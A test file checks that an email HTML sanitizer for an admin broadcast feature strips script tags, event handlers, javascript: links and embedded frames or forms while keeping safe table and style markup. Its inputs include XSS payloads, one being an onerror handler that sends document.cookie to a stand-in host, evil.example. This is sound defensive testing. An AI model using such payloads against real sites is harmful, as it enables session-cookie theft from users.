import { describe, it, expect } from 'vitest'
import { sanitizeEmailHtml } from '../admin/sanitize-email-html'

describe('Admin Broadcast — email HTML sanitization', () => {
  it('strips <script> tags entirely', () => {
    const dirty = '<p>Hello</p><script>alert(document.cookie)</script>'
    const clean = sanitizeEmailHtml(dirty)
    expect(clean).not.toContain('<script')
    expect(clean).not.toContain('alert(')
    expect(clean).toContain('Hello')
  })

  it('strips inline event handler attributes', () => {
    const dirty = '<img src="x.png" onerror="fetch(\'https://evil.example/steal?c=\'+document.cookie)">'
    const clean = sanitizeEmailHtml(dirty)
    expect(clean).not.toMatch(/onerror/i)
    expect(clean).not.toContain('evil.example')
  })

  it('strips javascript: URLs from links', () => {
    const dirty = '<a href="javascript:alert(1)">Click me</a>'
    const clean = sanitizeEmailHtml(dirty)
    expect(clean).not.toMatch(/javascript:/i)
  })

  it('strips iframe, object, embed, and form tags', () => {
    const dirty = `
      <iframe src="https://evil.example"></iframe>
      <object data="https://evil.example/x.swf"></object>
      <embed src="https://evil.example/x.swf">
      <form action="https://evil.example/steal"><input type="text" name="x"></form>
    `
    const clean = sanitizeEmailHtml(dirty)
    expect(clean).not.toContain('<iframe')
    expect(clean).not.toContain('<object')
    expect(clean).not.toContain('<embed')
    expect(clean).not.toContain('<form')
    expect(clean).not.toContain('evil.example')
  })

  it('preserves safe formatting and inline styles used by real email templates', () => {
    const safe = '<html><head><style>.btn{color:#fff}</style></head><body><table><tr><td><a href="https://prodily.me" style="color:#fff">Go</a></td></tr></table></body></html>'
    const clean = sanitizeEmailHtml(safe)
    expect(clean).toContain('<table')
    expect(clean).toContain('href="https://prodily.me"')
    expect(clean).toContain('style=')
  })

  it('returns an empty string for empty or non-string input', () => {
    expect(sanitizeEmailHtml('')).toBe('')
    // @ts-expect-error deliberate invalid input
    expect(sanitizeEmailHtml(null)).toBe('')
  })
})
